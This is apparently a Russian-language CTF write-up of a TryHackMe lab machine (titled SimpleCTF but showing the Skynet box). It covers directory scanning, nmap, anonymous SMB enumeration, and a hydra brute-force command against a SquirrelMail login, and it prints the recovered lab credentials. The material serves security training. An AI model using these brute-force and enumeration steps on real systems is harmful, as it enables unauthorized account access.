# 🖥️ Отчет по машине: SimpleCTF

**Дата:** 2026-05-04
**Платформа:** TryHackMe
**Сложность:** Easy
**Статус:** In progress

---
## Использованные интсрументы 
dirsearch
nmap
enum4linux
hydra

---
## 📡 1. Разведка 
Сперва просмотрю что за сайт, цель найти комментарии и ошибки
<img width="828" height="446" alt="Снимок экрана 2026-05-04 в 06 50 09" src="https://github.com/user-attachments/assets/6d671dce-a1ad-4402-b381-d7c905df9487" />

Это поисковая система, однако тут нет ни ссылок, ни комментариев. command injection тоже не работает

```
curl http://10.129.145.218
                         
<!DOCTYPE html>
<html>
        <head>
                <link rel="stylesheet" type="text/css" href="style.css">
                <link rel="shortcut icon" type="image/png" href="favicon.ico"/>
                <title>Skynet</title>
        </head>
        <body>
                <div>
                        <img src="image.png"/>
                        <form name="skynet" action="#" method="POST"><br>
                                <input type="search" class="search"><br>
                                <input type="submit" class="button" name="submit" value="Skynet Search">
                                <input type="submit" class="button" name="lucky" value="I'm Feeling Lucky">
                        </form>
                </div>
        </body>
</html>

```
Использую dirsearch для поиска скрытых путей

## Dirsearsh
<img width="804" height="660" alt="Снимок экрана 2026-05-04 в 06 52 27" src="https://github.com/user-attachments/assets/52bb81db-e540-41ad-8740-abe16bc3dd46" />
Отлично есть скрытые пути, однако код ошибки 301, "не авторизован" это значит где то есть страница входа.

```
301 -  313B  - /js  ->  http://10.129.145.218/js/

301 -  316B  - /admin  ->  http://10.129.145.218/admin/

301 -  317B  - /config  ->  http://10.129.145.218/config/

301 -  314B  - /css  ->  http://10.129.145.218/css/

301 -  323B  - /squirrelmail  ->  http://10.129.145.218/squirrelmail/
```

Да, страница входа на почту, пока отсутсвуеют креды, надо просмотреть открытые порты для их поиска.
<img width="403" height="299" alt="Снимок экрана 2026-05-04 в 07 00 27" src="https://github.com/user-attachments/assets/ddf26da5-4385-44ff-bde1-d9327e75b01a" />

## Nmap
Решаю просмотреть сразу все доступные порты с флагом ```-p-```
```
 sudo nmap -sC -sV -p- 10.129.145.218 -T4

```
Довольно массивный вывод и 6 открытых портов 

<img width="1102" height="554" alt="Снимок экрана 2026-05-04 в 07 05 36" src="https://github.com/user-attachments/assets/b29dd085-3a4d-4795-9175-f6fabb77121d" />

## Enum

Порты 139 и 445 это samba, значит запускаю ```enum4linux``` для поиска кредов 

Есть юзернеймы, так же виден доступ anonumous без пароля он станет 1 точкой входа для эскалации
<img width="540" height="79" alt="Снимок экрана 2026-05-04 в 07 15 55" src="https://github.com/user-attachments/assets/6afc7089-b559-4b14-8044-026a63d80cfe" />

```
Password Complexity: Disabled
Minimum Password Length: 5

```
Вхожу через smb и осматриваюсь 
```smbclient //10.129.145.218/anonymous -N ```

Вижу один файл attention.txt и папку logs

```
smb: \> pwd
Current directory is \\10.129.145.218\anonymous\
smb: \> ls 
  .                                   D        0  Thu Nov 26 11:04:00 2020
  ..                                  D        0  Tue Sep 17 03:20:17 2019
  attention.txt                       N      163  Tue Sep 17 23:04:59 2019
  logs                                D        0  Wed Sep 18 00:42:16 2019

                9204224 blocks of size 1024. 5829032 blocks available
smb: \> get attention.txt 
getting file \attention.txt of size 163 as attention.txt (0.8 KiloBytes/sec) (average 0.8 KiloBytes/sec)
```
Тут лежит 3 файла но по весу можно понять что только 1 из них нам нужен, log1 тоже забираю и выхожу 
```
smb: \> cd logs 
smb: \logs\> ls
  .                                   D        0  Wed Sep 18 00:42:16 2019
  ..                                  D        0  Thu Nov 26 11:04:00 2020
  log2.txt                            N        0  Wed Sep 18 00:42:13 2019
  log1.txt                            N      471  Wed Sep 18 00:41:59 2019
  log3.txt                            N        0  Wed Sep 18 00:42:16 2019

                9204224 blocks of size 1024. 5829032 blocks available
smb: \logs\> get log1.txt 
getting file \logs\log1.txt of size 471 as log1.txt (2.4 KiloBytes/sec) (average 1.6 KiloBytes/sec)
smb: \logs\> q
```
Читаю и вижу список предпологаемых паролей и юзернейм который был и в enum
<img width="685" height="521" alt="Снимок экрана 2026-05-04 в 07 29 13" src="https://github.com/user-attachments/assets/06ba5e90-4813-4727-9c6b-b7518088d575" />
## Hydra
Значит начинаю брут, вот только к smb и ssh он не подошел, значит это может быть вход в почту 
<img width="685" height="386" alt="Снимок экрана 2026-05-04 в 07 30 37" src="https://github.com/user-attachments/assets/df2719f6-f195-45f4-a235-105ab40f1078" />
мне кажется это слишком удачный результат, но все исходит из неправильного запроса гидре 

здесь же, если почитать можно увидеть что login form не login.php а redirect.php от того и такой результат 
<img width="454" height="18" alt="Снимок экрана 2026-05-04 в 07 31 54" src="https://github.com/user-attachments/assets/e0d2d3e9-c5ce-4051-9d31-1583ef9a175b" />

пересобираю команду и готово

```
hydra -l milesdyson -P /home/w3awer/skynet/pass.txt 10.129.145.218 http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^:F=Unknown user or password incorrect."
```
<img width="687" height="206" alt="Снимок экрана 2026-05-04 в 07 39 38" src="https://github.com/user-attachments/assets/019ddead-304c-4693-af7d-27ae3460f676" />

login: milesdyson   password: cyborg007haloterminator

И мы внутри 
<img width="822" height="333" alt="Снимок экрана 2026-05-04 в 07 42 26" src="https://github.com/user-attachments/assets/4e5e1965-d845-4197-8e15-fa412bc9a7e8" />
